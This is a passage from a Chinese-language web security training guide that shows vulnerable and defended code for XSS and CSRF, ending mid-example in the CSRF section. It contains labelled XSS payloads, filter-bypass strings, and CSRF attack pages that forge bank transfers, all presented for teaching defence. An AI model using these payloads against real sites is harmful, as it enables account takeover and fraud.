# Web 安全专项训练 — XSS / CSRF / Sanitization / CSP 深度攻防

> 2026-04-29 13:00 | 娄总 | 深度攻防 + 真实场景演练 + 安全架构

---

## 目录

1. [XSS 深度攻防](#1-xss-深度攻防)
2. [CSRF 深度攻防](#2-csrf-深度攻防)
3. [Sanitization 深度实战](#3-sanitization-深度实战)
4. [Content Security Policy 实战](#4-csp-实战)
5. [高级攻击向量](#5-高级攻击向量)
6. [综合攻防演练场](#6-综合攻防演练场)
7. [安全架构 Checklist](#7-安全架构-checklist)

---

## 1. XSS 深度攻防 <a id="1-xss-深度攻防"></a>

### 1.1 攻击面全景图

```
┌─────────────────────────────────────────────────────────────┐
│                    XSS 攻击面全景                            │
├──────────────┬──────────────────────────────────────────────┤
│   注入点      │  危险上下文                                  │
├──────────────┼──────────────────────────────────────────────┤
│ HTML 内容    │  <div>USER_INPUT</div>                       │
│ HTML 属性    │  <div title="USER_INPUT">                    │
│ 事件处理器    │  <div onclick="USER_INPUT">                  │
│ CSS 属性     │  <div style="background:USER_INPUT">         │
│ URL 属性     │  <a href="USER_INPUT">                       │
│ JavaScript   │  <script>var x = "USER_INPUT";</script>      │
│ JSONP 回调   │  ?callback=USER_INPUT                        │
│ src 属性     │  <img src="USER_INPUT">                      │
│ form action  │  <form action="USER_INPUT">                  │
│ iframe src   │  <iframe src="USER_INPUT">                   │
└──────────────┴──────────────────────────────────────────────┘
```

### 1.2 八种 XSS 攻击向量深度解析

#### 向量 1: HTML 内容注入

```html
<!-- ❌ 漏洞代码 -->
<!-- 服务端模板直接输出用户输入 -->
<div class="search-result">
  搜索结果: {{{query}}}  <!-- Handlebars 三重括号不转义 -->
</div>

<!-- ✅ 防御: 使用双括号自动转义 -->
<div class="search-result">
  搜索结果: {{query}}  <!-- Handlebars 双括号自动 HTML 编码 -->
</div>
```

```javascript
// ❌ 漏洞: React dangerouslySetInnerHTML
function SearchResults({ query }) {
  return (
    <div dangerouslySetInnerHTML={{ __html: query }} />
  );
}

// ✅ 防御: 使用 sanitize
import DOMPurify from 'dompurify';

function SearchResults({ query }) {
  const clean = DOMPurify.sanitize(query);
  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}

// ✅ 最佳: 避免 HTML 渲染
function SearchResults({ query }) {
  return <div>{query}</div>;  // React 自动转义
}
```

#### 向量 2: HTML 属性注入

```html
<!-- ❌ 漏洞: 属性值未转义 -->
<!-- 攻击者输入: " onmouseover="alert(1) x=" -->
<input type="text" value="{{userInput}}" />
<!-- 渲染结果: -->
<input type="text" value="" onmouseover="alert(1) x="" />

<!-- ✅ 防御: 属性值转义 -->
<input type="text" value="{{escapeAttr(userInput)}}" />

<!-- ✅ Vue 自动转义 -->
<input type="text" :value="userInput" />
```

```javascript
// ✅ 属性值转义函数
function escapeAttr(str) {
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/`/g, '&#96;')
    .replace(/\//g, '&#x2F;');
}
```

#### 向量 3: JavaScript 上下文注入

```html
<!-- ❌ 漏洞: 在 script 标签中直接插入 -->
<script>
  var userName = "{{userName}}";  // 攻击者输入: "; alert(1); var x = "
  var config = { redirect: "{{redirectUrl}}" };
</script>

<!-- ✅ 防御: JSON 编码 -->
<script>
  var userName = {{jsonEncode(userName)}};
  var config = {{jsonEncode(config)}};
</script>
```

```javascript
// ✅ 安全 JSON 编码 (防止跳出字符串上下文)
function jsonEncode(value) {
  // JSON.stringify 会自动转义 </script> 等危险字符
  const json = JSON.stringify(value);
  // 额外防御: 转义 </script> 防止闭合 script 标签
  return json
    .replace(/\//g, '\\/')
    .replace(/<!--/g, '\\u003C!--')
    .replace(/<script/gi, '\\u003Cscript')
    .replace(/<\/script/gi, '\\u003C/script');
}

// 使用示例
const userName = '"; alert(1); var x = "'
// jsonEncode 输出: "\"; alert(1); var x = \""
// 在 HTML 中: var userName = "\"; alert(1); var x = \"";
// 安全! 因为引号被转义了
```

#### 向量 4: URL 上下文注入

```html
<!-- ❌ 漏洞: javascript: 协议 -->
<a href="{{userUrl}}">点击</a>
<!-- 攻击者输入: javascript:alert(1) -->

<!-- ❌ 漏洞: data: 协议 -->
<iframe src="{{userUrl}}"></iframe>
<!-- 攻击者输入: data:text/html,<script>alert(1)</script> -->

<!-- ✅ 防御: URL 协议白名单 -->
```

```javascript
// ✅ URL 协议白名单校验
const ALLOWED_PROTOCOLS = ['http:', 'https:', 'mailto:', 'tel:'];

function sanitizeUrl(url) {
  try {
    const parsed = new URL(url, window.location.href);
    if (!ALLOWED_PROTOCOLS.includes(parsed.protocol)) {
      return '#';  // 替换为安全值
    }
    return parsed.href;
  } catch {
    return '#';
  }
}

// ✅ 严格 URL 校验
function validateUrl(url) {
  const urlPattern = /^https?:\/\/[a-zA-Z0-9][-a-zA-Z0-9]*\.[a-zA-Z]{2,}\/?.*$/;
  if (!urlPattern.test(url)) {
    throw new Error('Invalid URL');
  }
  return url;
}

// ✅ React 组件安全 URL
function SafeLink({ href, children }) {
  const safeHref = sanitizeUrl(href);
  return (
    <a href={safeHref} target="_blank" rel="noopener noreferrer">
      {children}
    </a>
  );
}
```

#### 向量 5: CSS 上下文注入

```html
<!-- ❌ 漏洞: CSS 表达式 (旧 IE) 和 url() 注入 -->
<div style="background: url({{userBg}})">

<!-- 攻击者输入: javascript:alert(1) -->
<!-- 攻击者输入: "onload="alert(1) -->

<!-- ✅ 防御: CSS 值转义 -->
```

```javascript
// ✅ CSS 值转义
function escapeCss(str) {
  return String(str).replace(/[^a-zA-Z0-9_-]/g, (char) => {
    const code = char.charCodeAt(0);
    return '\\' + code.toString(16) + ' ';
  });
}

// ✅ 严格 CSS 值白名单
const CSS_COLOR_KEYWORDS = new Set([
  'red', 'blue', 'green', 'yellow', 'black', 'white',
  'transparent', 'inherit', 'initial', 'unset',
]);

function sanitizeCssColor(value) {
  // 仅允许颜色关键字或 hex 值
  if (CSS_COLOR_KEYWORDS.has(value.toLowerCase())) {
    return value;
  }
  if (/^#[0-9a-fA-F]{3,8}$/.test(value)) {
    return value;
  }
  if (/^rgba?\(\s*\d{1,3},\s*\d{1,3},\s*\d{1,3}(?:,\s*[\d.]+)?\s*\)$/.test(value)) {
    return value;
  }
  return '#000000';  // 默认黑色
}

// ✅ CSS 属性值严格校验
function sanitizeCssValue(property, value) {
  const propertySanitizers = {
    'background-color': sanitizeCssColor,
    'color': sanitizeCssColor,
    'font-size': (v) => /^\d+(px|em|rem|%)$/.test(v) ? v : '16px',
    'width': (v) => /^\d+(px|em|rem|%)$/.test(v) ? v : 'auto',
    'height': (v) => /^\d+(px|em|rem|%)$/.test(v) ? v : 'auto',
  };

  const sanitizer = propertySanitizers[property];
  return sanitizer ? sanitizer(value) : '';
}
```

#### 向量 6: DOM-Based XSS (客户端)

```javascript
// ❌ 漏洞: innerHTML 直接操作
function renderUserProfile() {
  const username = new URLSearchParams(window.location.search).get('name');
  document.getElementById('profile').innerHTML = `
    <h1>${username}</h1>
    <p>Welcome back!</p>
  `;
}

// ❌ 漏洞: document.write
function renderFromHash() {
  document.write('<h1>' + decodeURIComponent(location.hash.slice(1)) + '</h1>');
}

// ❌ 漏洞: outerHTML
function updateElement() {
  const el = document.getElementById('target');
  el.outerHTML = `<div>${location.search}</div>`;
}

// ❌ 漏洞: insertAdjacentHTML
function addComment() {
  const comment = document.getElementById('input').value;
  document.getElementById('comments').insertAdjacentHTML('beforeend', comment);
}

// ❌ 漏洞: eval / setTimeout / setInterval
function executeUserCode() {
  const code = localStorage.getItem('userScript');
  eval(code);  // 致命!
  setTimeout(code, 1000);  // 同样危险!
}

// ✅ 防御: 使用 textContent / text
function renderUserProfile() {
  const username = new URLSearchParams(window.location.search).get('name');
  const profile = document.getElementById('profile');
  profile.innerHTML = '<h1></h1><p>Welcome back!</p>';
  profile.querySelector('h1').textContent = username;
}

// ✅ 防御: DOM 创建 API
function addComment() {
  const comment = document.getElementById('input').value;
  const comments = document.getElementById('comments');
  const div = document.createElement('div');
  div.className = 'comment';
  div.textContent = comment;  // 自动转义
  comments.appendChild(div);
}

// ✅ 防御: 安全的模板渲染
function safeTemplate(template, data) {
  return template.replace(/\{\{(\w+)\}\}/g, (match, key) => {
    const value = data[key] || '';
    // HTML 转义
    return String(value)
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&#x27;');
  });
}
```

#### 向量 7: 二次渲染 XSS (Stored → DOM)

```javascript
// ❌ 漏洞: 服务端已转义，但前端二次渲染时未处理
// 1. 用户提交: <img src=x onerror=alert(1)>
// 2. 服务端存储转义后: &lt;img src=x onerror=alert(1)&gt;
// 3. 前端获取后:
const comment = response.data.comment;  // "&lt;img src=x..."
// 4. 错误: 前端解码后再插入
const decoded = decodeHTML(comment);
element.innerHTML = decoded;  // XSS!

// ✅ 防御: 信任链原则 — 要么全程不信任，要么全程信任
// 方案 A: 服务端存储原始数据，渲染时统一转义
// 方案 B: 服务端转义后，前端直接用 textContent

function decodeHTML(html) {
  const txt = document.createElement('textarea');
  txt.innerHTML = html;
  return txt.value;
}

// ✅ 安全: 二次渲染不二次解码
function renderStoredComment(comment) {
  // comment 已经是 HTML 编码后的字符串
  // 直接用 textContent 渲染，浏览器会自动解码显示
  element.textContent = comment;  // 显示为纯文本 &lt;img...&gt;
}
```

#### 向量 8: 基于框架的 XSS (Angular/Vue/React 特定)

```html
<!-- ❌ Angular: ng-bind-html 不安全 -->
<div ng-bind-html="userContent"></div>

<!-- ✅ Angular: 使用 $sce.trustAsHtml + sanitize -->
<div ng-bind-html="trustedContent"></div>
<!-- controller 中: -->
<!-- $scope.trustedContent = $sce.trustAsHtml(DOMPurify.sanitize(userContent)); -->

<!-- ❌ Vue: v-html -->
<div v-html="userContent"></div>

<!-- ✅ Vue: 使用 sanitize -->
<div v-html="sanitizedContent"></div>
<!-- computed: { sanitizedContent() { return DOMPurify.sanitize(this.userContent) } } -->

<!-- ❌ React: dangerouslySetInnerHTML -->
<div dangerouslySetInnerHTML={{ __html: userContent }} />

<!-- ✅ React: sanitize first -->
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(userContent) }} />
```

### 1.3 高级 XSS 绕过技术 (了解攻击才能更好防御)

```javascript
// === 绕过技术 1: 大小写混淆 ===
// <ScRiPt>alert(1)</ScRiPt>  — HTML 标签不区分大小写
// 防御: 不依赖正则匹配标签名，使用 HTML 解析器

// === 绕过技术 2: 双写绕过 ===
// <scr<script>ipt>alert(1)</scr</script>ipt>
// 某些 WAF 只替换一次 <script>
// 防御: 递归替换或使用成熟的 sanitize 库

// === 绕过技术 3: 编码绕过 ===
// \u003cscript\u003ealert(1)\u003c/script\u003e
// &#60;script&#62;alert(1)&#60;/script&#62;
// %3Cscript%3Ealert(1)%3C/script%3E
// 防御: 多层解码后再转义

// === 绕过技术 4: 事件处理器变异 ===
// <svg onload=alert(1)>
// <body onload=alert(1)>
// <img src=x onerror=alert(1)>
// <details ontoggle=alert(1) open>
// <marquee onstart=alert(1)>
// <video><source onerror=alert(1)>
// 防御: 禁止所有事件处理器属性

// === 绕过技术 5: CSS 注入 ===
// <div style="background-image: url('javascript:alert(1)')">
// <div style="width: expression(alert(1))">  // IE only
// 防御: 白名单 CSS 属性 + 值

// === 绕过技术 6: 协议绕过 ===
// <a href="javascript:alert(1)">
// <a href="JaVaScRiPt:alert(1)">
// <a href="javascript&#58;alert(1)">
// <a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">
// <a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
// 防御: URL 协议白名单

// === 绕过技术 7: 模板注入 ===
// {{constructor.constructor('alert(1)')()}}  // Vue 2.x
// ${alert(1)}  // 模板字符串注入
// 防御: 沙箱化模板引擎 + 输入校验

// === 绕过技术 8: Unicode 归一化 ===
// 使用 Unicode 等价字符绕过过滤
// 防御: 输入归一化 (NFC/NFD)
```

### 1.4 完整 XSS 防御中间件

```typescript
// --- File: src/security/xss-defender.ts ---

/**
 * XSS 防御器 — 多层防御策略
 * 原则: 纵深防御 (Defense in Depth)
 */

interface XSSDefenderConfig {
  // 允许的 HTML 标签
  allowedTags?: string[];
  // 允许的 HTML 属性
  allowedAttrs?: Record<string, string[]>;
  // 允许的 CSS 属性
  allowedCssProps?: string[];
  // 是否移除 script 标签
  stripScripts?: boolean;
  // 是否移除事件处理器
  stripEventHandlers?: boolean;
}

const DEFAULT_CONFIG: Required<XSSDefenderConfig> = {
  allowedTags: [
    'b', 'i', 'em', 'strong', 'a', 'p', 'br', 'ul', 'ol', 'li',
    'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'blockquote', 'code',
    'pre', 'img', 'table', 'thead', 'tbody', 'tr', 'th', 'td',
  ],
  allowedAttrs: {
    'a': ['href', 'title', 'target'],
    'img': ['src', 'alt', 'width', 'height'],
    '*': ['class'],
  },
  allowedCssProps: [
    'color', 'background-color', 'font-size', 'font-weight',
    'text-align', 'margin', 'padding', 'border',
  ],
  stripScripts: true,
  stripEventHandlers: true,
};

class XSSDefender {
  private config: Required<XSSDefenderConfig>;

  constructor(config?: XSSDefenderConfig) {
    this.config = { ...DEFAULT_CONFIG, ...config };
  }

  /**
   * 第一层: HTML 实体编码 (纯文本场景)
   */
  encodeHtml(str: string): string {
    const map: Record<string, string> = {
      '&': '&amp;', '<': '&lt;', '>': '&gt;',
      '"': '&quot;', "'": '&#x27;', '/': '&#x2F;', '`': '&#96;',
    };
    return String(str).replace(/[&<>"'`\/]/g, (c) => map[c]);
  }

  /**
   * 第二层: 属性值编码
   */
  encodeAttr(str: string): string {
    return String(str)
      .replace(/&/g, '&amp;')
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&#x27;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/`/g, '&#96;')
      .replace(/\//g, '&#x2F;')
      .replace(/=/g, '&#x3D;');
  }

  /**
   * 第三层: JavaScript 字符串编码
   */
  encodeJs(str: string): string {
    return String(str)
      .replace(/\\/g, '\\\\')
      .replace(/'/g, '\\\'')
      .replace(/"/g, '\\"')
      .replace(/\n/g, '\\n')
      .replace(/\r/g, '\\r')
      .replace(/\t/g, '\\t')
      .replace(/<\/script/gi, '\\u003C/script')
      .replace(/<!--/g, '\\u003C!--');
  }

  /**
   * 第四层: URL 编码
   */
  encodeUrl(str: string): string {
    return encodeURIComponent(str);
  }

  /**
   * 第五层: HTML 清洗 (富文本场景)
   * 生产环境建议使用 DOMPurify
   */
  sanitizeHtml(html: string): string {
    if (this.config.stripScripts) {
      // 移除 script 标签及其内容
      html = html.replace(/<script[\s\S]*?<\/script>/gi, '');
      html = html.replace(/<script[\s\S]*?>/gi, '');
    }

    if (this.config.stripEventHandlers) {
      // 移除所有事件处理器
      html = html.replace(/\s+on\w+\s*=\s*["'][\s\S]*?["']/gi, '');
      html = html.replace(/\s+on\w+\s*=\s*\S+/gi, '');
    }

    // 移除 javascript: 和 data: 协议
    html = html.replace(/javascript\s*:/gi, '');
    html = html.replace(/data\s*:/gi, '');
    html = html.replace(/vbscript\s*:/gi, '');

    // 移除 style 中的 expression
    html = html.replace(/expression\s*\(/gi, '');
    html = html.replace(/url\s*\(\s*['"]?\s*javascript/gi, '');

    return html;
  }

  /**
   * 第六层: URL 安全校验
   */
  sanitizeUrl(url: string): string {
    const allowed = ['http:', 'https:', 'mailto:', 'tel:'];
    try {
      const parsed = new URL(url, 'http://example.com');
      if (!allowed.includes(parsed.protocol)) {
        return '#';
      }
      return parsed.href;
    } catch {
      return '#';
    }
  }

  /**
   * 完整清洗管道
   */
  clean(input: string, context: 'html' | 'text' | 'attr' | 'js' | 'url'): string {
    // 先做 Unicode 归一化
    let result = input.normalize('NFC');

    switch (context) {
      case 'text':
        return this.encodeHtml(result);
      case 'attr':
        return this.encodeAttr(result);
      case 'js':
        return this.encodeJs(result);
      case 'url':
        return this.sanitizeUrl(result);
      case 'html':
        return this.sanitizeHtml(result);
      default:
        return this.encodeHtml(result);
    }
  }
}

// === 使用示例 ===
const defender = new XSSDefender();

// 纯文本输出
const safeText = defender.clean(userInput, 'text');

// 属性值输出
const safeAttr = defender.clean(userInput, 'attr');

// JavaScript 字符串
const safeJs = defender.clean(userInput, 'js');

// URL 输出
const safeUrl = defender.clean(userInput, 'url');

// 富文本 (允许部分 HTML)
const safeHtml = defender.sanitizeHtml(richText);
```

---

## 2. CSRF 深度攻防 <a id="2-csrf-深度攻防"></a>

### 2.1 CSRF 攻击原理

```
┌─────────────┐     ┌─────────────┐     ┌─────────────┐
│   受害者     │     │  银行网站    │     │  攻击者网站  │
│  (浏览器)    │     │ (bank.com)  │     │ (evil.com)  │
└──────┬──────┘     └──────┬──────┘     └──────┬──────┘
       │                   │                   │
       │  1. 登录 bank.com  │                   │
       │──────────────────>│                   │
       │  Set-Cookie: session=abc |           │
       │<──────────────────│                   │
       │                   │                   │
       │  2. 访问 evil.com  │                   │
       │──────────────────────────────────────>│
       │  3. evil.com 返回恶意页面              │
       │<──────────────────────────────────────│
       │  包含: <img src="bank.com/transfer?to=attacker&amount=10000"> │
       │                   │                   │
       │  4. 浏览器自动携带 Cookie 请求 bank.com │
       │──────────────────>│                   │
       │  Cookie: session=abc                 │
       │  转账成功! 💀                        │
       │<──────────────────│                   │
```

### 2.2 攻击场景

```html
<!-- 场景 1: 图片标签 CSRF -->
<!-- 攻击者网站上的隐藏图片 -->
<img src="https://bank.com/api/transfer?to=attacker&amount=99999"
     style="display:none" />

<!-- 场景 2: 表单自动提交 -->
<form action="https://bank.com/api/transfer" method="POST" id="csrf-form">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="99999">
</form>
<script>document.getElementById('csrf-form').submit();</script>

<!-- 场景 3: Fetch API (需要 credentials: 'include') -->
<script>
  fetch('https://bank.com/api/transfer', {
    method: 'POST',
    credentials: 'include',  // 自动携带 Cookie
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: 'to=attacker&amount=99999',
  });
</script>

<!-- 场景 4: AJAX 请求 -->
<script>
  const xhr = new XMLHttpRequest();
  xhr.open('POST', 'https://bank.com/api/transfer', true);
  xhr.withCredentials = true;
  xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
  xhr.send('to=attacker&amount=99999');
</script>
```

### 2.3 防御方案对比

```
┌──────────────────┬──────────┬──────────┬──────────┬──────────┐
│  防御方案        │  安全性  │  兼容性  │  性能    │  推荐度  │
├──────────────────┼──────────┼──────────┼──────────┼──────────┤
│ SameSite Cookie  │  ⭐⭐⭐⭐  │  ⭐⭐⭐⭐⭐│  ⭐⭐⭐⭐⭐│  ✅ 基础  │
│ CSRF Token       │  ⭐⭐⭐⭐⭐│  ⭐⭐⭐⭐ │  ⭐⭐⭐  │  ✅ 核心  │
│ Referer 校验     │  ⭐⭐⭐  │  ⭐⭐⭐  │  ⭐⭐⭐⭐⭐│  ✅ 辅助  │
│ Custom Header    │  ⭐⭐⭐⭐⭐│  ⭐⭐⭐  │  ⭐⭐⭐⭐⭐│  ✅ API  │
│ Double Submit    │  ⭐⭐⭐⭐ │  ⭐⭐⭐⭐⭐│  ⭐⭐⭐⭐ │  ✅ 备选  │
│ User Interaction │  ⭐⭐⭐⭐⭐│  ⭐⭐⭐⭐ │  ⭐⭐⭐⭐⭐│  ✅ 敏感  │
└──────────────────┴──────────┴──────────┴──────────┴──────────┘
```

### 2.4 SameSite Cookie 防御

```javascript
// --- File: src/security/cookie-config.ts ---

/**
 * Cookie SameSite 配置
 * 第一道防线: 浏览器级别的 CSRF 防御
 */

// ❌ 不安全: 无 SameSite
app.use(cookieSession({
  name: 'session',
  secret: process.env.SESSION_SECRET,
  // 没有 SameSite! 默认 Lax
}));

// ✅ 基础防御: SameSite=Strict
app.use(cookieSession({
  name: 'session',
  secret: process.env.SESSION_SECRET,
  cookie: {
    httpOnly: true,
    secure: true,        // 仅 HTTPS
    sameSite: 'strict',  // 严格模式: 跨站请求不发送 Cookie
    maxAge: 24 * 60 * 60 * 1000,
  },
}));

// ✅ 平衡模式: SameSite=Lax (允许 GET 跨站导航)
app.use(cookieSession({
  name: 'session',
  secret: process.env.SESSION_SECRET,
  cookie: {
    httpOnly: true,
    secure: true,
    sameSite: 'lax',     // Lax 模式: 允许顶级导航 GET
    maxAge: 24 * 60 * 60 * 1000,
  },
}));

// ✅ 精细控制: 多 Cookie 策略
// 主 session cookie: SameSite=Strict
res.cookie('session', token, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict',
});

// CSRF token cookie: SameSite=None (需要跨站读取)
res.cookie('csrf_token', csrfToken, {
  httpOnly: false,       // 需要 JS 读取
  secure: true,
  sameSite: 'none',
});
```

### 2.5 CSRF Token 完整实现

```typescript
// --- File: src/security/csrf-token.ts ---

import crypto from 'crypto';

/**
 * CSRF Token 管理器
 * 核心防御: 同步器模式 (Synchronizer Token Pattern)
 */

interface CsrfTokenPair {
  cookieToken: string;   // 存储在 Cookie 中 (HttpOnly)
  bodyToken: string;     // 存储在请求体/Header 中
}

class CsrfTokenManager {
  private secret: string;
  private tokenLength: number;

  constructor(secret: string, tokenLength = 32) {
    this.secret = secret;
    this.tokenLength = tokenLength;
  }

  /**
   * 生成 CSRF Token 对
   * Double Submit Cookie 模式
   */
  generate(): CsrfTokenPair {
    const cookieToken = crypto.randomBytes(this.tokenLength).toString('hex');
    const bodyToken = crypto
      .createHmac('sha256', this.secret)
      .update(cookieToken)
      .digest('hex');

    return { cookieToken, bodyToken };
  }

  /**
   * 验证 CSRF Token
   */
  verify(cookieToken: string, bodyToken: string): boolean {
    if (!cookieToken || !bodyToken) return false;

    const expectedBodyToken = crypto
      .createHmac('sha256', this.secret)
      .update(cookieToken)
      .digest('hex');

    // 定时比较防止时序攻击
    return crypto.timingSafeEqual(
      Buffer.from(bodyToken, 'hex'),
      Buffer.from(expectedBodyToken, 'hex'),
    );
  }

  /**
   * 生成一次性 Token (用于表单)
   */
  generateOneTime(): { token: string; expires: number } {
    const token = crypto.randomBytes(this.tokenLength).toString('hex');
    const expires = Date.now() + 30 * 60 * 1000; // 30 分钟

    return { token, expires };
  }
}

// --- File: src/middleware/csrf-protection.ts ---

import { Request, Response, NextFunction } from 'express';

/**
 * CSRF 保护中间件
 */
function csrfProtection(csrfManager: CsrfTokenManager) {
  return (req: Request, res: Response, next: NextFunction) => {
    // 安全方法不需要 CSRF 验证
    const safeMethods = ['GET', 'HEAD', 'OPTIONS'];
    if (safeMethods.includes(req.method.toUpperCase())) {
      return next();
    }

    // 从 Cookie 获取 token
    const cookieToken = req.cookies['csrf_token'];

    // 从请求体或 Header 获取 token
    const bodyToken =
      req.headers['x-csrf-token'] ||
      req.headers['x-xsrf-token'] ||
      (req.body && req.body._csrf);

    if (!cookieToken || !bodyToken) {
      return res.status(403).json({
        error: 'CSRF token missing',
        code: 'CSRF_MISSING',
      });
    }

    if (!csrfManager.verify(cookieToken, bodyToken as string)) {
      return res.status(403).json({
        error: 'CSRF token invalid',
        code: 'CSRF_INVALID',
      });
    }

    next();
  };
}

// --- 使用示例 ---

const csrfManager = new CsrfTokenManager(process.env.CSRF_SECRET!);

// 获取 CSRF Token
app.get('/api/csrf-token', (req, res) => {
  const tokens = csrfManager.generate();

  res.cookie('csrf_token', tokens.cookieToken, {
    httpOnly: false,      // JS 需要读取
    secure: true,
    sameSite: 'lax',
  });

  res.json({ csrfToken: tokens.bodyToken });
});

// 应用 CSRF 保护
app.use(csrfProtection(csrfManager));

// 安全路由
app.post('/api/transfer', (req, res) => {
  // CSRF 已验证
  res.json({ success: true });
});
```

### 2.6 前端 CSRF Token 集成

```typescript
// --- File: src/utils/csrf-fetch.ts ---

/**
 * 带 CSRF Token 的 Fetch 封装
 */

let csrfTokenCache: string | null = null;

async function getCsrfToken(): Promise<string> {
  if (csrfTokenCache) return csrfTokenCache;

  const response = await fetch('/api/csrf-token');
  const data = await response.json();
  csrfTokenCache = data.csrfToken;
  return csrfTokenCache;
}

async function secureFetch(url: string, options: RequestInit = {}): Promise<Response> {
  const isSafeMethod = ['GET', 'HEAD', 'OPTIONS'].includes(
    (options.method || 'GET').toUpperCase()
  );

  const headers = new Headers(options.headers);

  if (!isSafeMethod) {
    const token = await getCsrfToken();
    headers.set('X-CSRF-Token', token);
  }

  return fetch(url, {
    ...options,
    headers,
    credentials: 'same-origin',  // 仅同源请求携带 Cookie
  });
}

// --- Axios 拦截器集成 ---

import axios from 'axios';

// 请求拦截器: 自动添加 CSRF Token
axios.interceptors.request.use(async (config) => {
  if (!['get', 'head', 'options'].includes(config.method?.toLowerCase() || '')) {
    const token = await getCsrfToken();
    config.headers['X-CSRF-Token'] = token;
  }
  return config;
});

// 响应拦截器: Token 过期时刷新
axios.interceptors.response.use(
  (response) => response,
  async (error) => {
    if (error.response?.status === 403 &&
        error.response?.data?.code === 'CSRF_INVALID') {
      // Token 过期，刷新后重试
      csrfTokenCache = null;
      const token = await getCsrfToken();
      error.config.headers['X-CSRF-Token'] = token;
      return axios(error.config);
    }
    return Promise.reject(error);
  }
);
```

### 2.7 Referer / Origin 校验

```typescript
// --- File: src/middleware/referer-check.ts ---

/**
 * Referer / Origin 校验中间件
 * 辅助防御: 验证请求来源
 */

interface RefererCheckConfig {
  allowedOrigins: string[];
  // 是否允许空 Referer (某些隐私模式会发送空 Referer)
  allowEmptyReferer: boolean;
}

function refererCheck(config: RefererCheckConfig) {
  return (req: Request, res: Response, next: NextFunction) => {
    const safeMethods = ['GET', 'HEAD', 'OPTIONS'];
    if (safeMethods.includes(req.method.toUpperCase())) {
      return next();
    }

    const referer = req.headers.referer || req.headers.referrer;
    const origin = req.headers.origin;

    // 同源请求: 检查 Origin
    if (origin) {
      if (!config.allowedOrigins.includes(origin)) {
        console.warn(`[Security] Blocked request from origin: ${origin}`);
        return res.status(403).json({
          error: 'Invalid origin',
          code: 'ORIGIN_INVALID',
        });
      }
      return next();
    }

    // 跨站请求: 检查 Referer
    if (referer) {
      try {
        const refererUrl = new URL(referer);
        if (!config.allowedOrigins.includes(refererUrl.origin)) {
          console.warn(`[Security] Blocked request from referer: ${referer}`);
          return res.status(403).json({
            error: 'Invalid referer',
            code: 'REFERER_INVALID',
          });
        }
      } catch {
        return res.status(400).json({
          error: 'Malformed referer',
          code: 'REFERER_MALFORMED',
        });
      }
      return next();
    }

    // 空 Referer
    if (config.allowEmptyReferer) {
      // 记录日志但不阻止
      console.warn('[Security] Request with empty referer');
      return next();
    }

    return res.status(403).json({
      error: 'Missing referer',
      code: 'REFERER_MISSING',
    });
  };
}

// 使用
app.use(refererCheck({
  allowedOrigins: [
    'https://myapp.com',
    'https://admin.myapp.com',
  ],
  allowEmptyReferer: false,
}));
```

### 2.8 自定义 Header 防御 (API 专用)

```javascript
// --- 原理: 跨域请求无法设置自定义 Header (CORS 预检会阻止) ---

// ✅ 防御: 要求所有 API 请求携带自定义 Header
// 浏览器同源策略: 跨域 fetch/XHR 设置自定义 Header 会触发 CORS 预检
// 攻击者无法从 evil.com 设置 X-Requested-With

// 中间件实现
function apiTokenCheck(req, res, next) {
  const requestedWith = req.headers['x-requested-with'];

  // API 路由要求自定义 Header
  if (req.path.startsWith('/api/') && requestedWith !== 'XMLHttpRequest') {
    // 检查是否有 CORS 预检通过
    const origin = req.headers.origin;
    if (origin) {
      // 跨域请求但没有预检 → 可能是 CSRF
      return res.status(403).json({ error: 'Missing API header' });
    }
  }

  next();
}

// 前端自动添加
fetch('/api/transfer', {
  method: 'POST',
  headers: {
    'X-Requested-With': 'XMLHttpRequest',
    'Content-Type': 'application/json',
  },
  body: JSON.stringify({ to: 'user123', amount: 100 }),
});
```

### 2.9 敏感操作二次验证

```typescript
// --- File: src/security/sensitive-action-guard.ts ---

/**
 * 敏感操作二次验证
 * 最高安全级别: 用户交互确认
 */

interface SensitiveActionGuardConfig {
  // 需要二次验证的操作
  sensitiveActions: string[];
  // 验证方式
  verificationMethod: 'otp' | 'password' | 'biometric';
  // OTP 过期时间 (秒)
  otpExpiry: number;
}

class SensitiveActionGuard {
  private config: SensitiveActionGuardConfig;
  private otpStore: Map<string, { code: string; expires: number }>;

  constructor(config: SensitiveActionGuardConfig) {
    this.config = config;
    this.otpStore = new Map();
  }

  /**
   * 生成 OTP
   */
  generateOtp(userId: string): string {
    const otp = crypto.randomInt(100000, 999999).toString();
    this.otpStore.set(userId, {
      code: otp,
      expires: Date.now() + this.config.otpExpiry * 1000,
    });
    return otp;
  }

  /**
   * 验证 OTP
   */
  verifyOtp(userId: string, otp: string): boolean {
    const stored = this.otpStore.get(userId);
    if (!stored) return false;
    if (Date.now() > stored.expires) {
      this.otpStore.delete(userId);
      return false;
    }
    return crypto.timingSafeEqual(
      Buffer.from(otp),
      Buffer.from(stored.code),
    );
  }

  /**
   * 检查是否需要二次验证
   */
  requiresVerification(action: string): boolean {
    return this.config.sensitiveActions.includes(action);
  }
}

// 使用示例
const guard = new SensitiveActionGuard({
  sensitiveActions: ['transfer', 'delete_account', 'change_password', 'withdraw'],
  verificationMethod: 'otp',
  otpExpiry: 300,  // 5 分钟
});

// 请求 OTP
app.post('/api/verify/request-otp', authMiddleware, async (req, res) => {
  const { action } = req.body;
  if (!guard.requiresVerification(action)) {
    return res.json({ required: false });
  }

  const otp = guard.generateOtp(req.user.id);
  // 发送 OTP (短信/邮件/推送)
  await sendOtp(req.user.email, otp);

  res.json({ required: true, sent: true });
});

// 验证 OTP 后执行操作
app.post('/api/transfer', authMiddleware, (req, res) => {
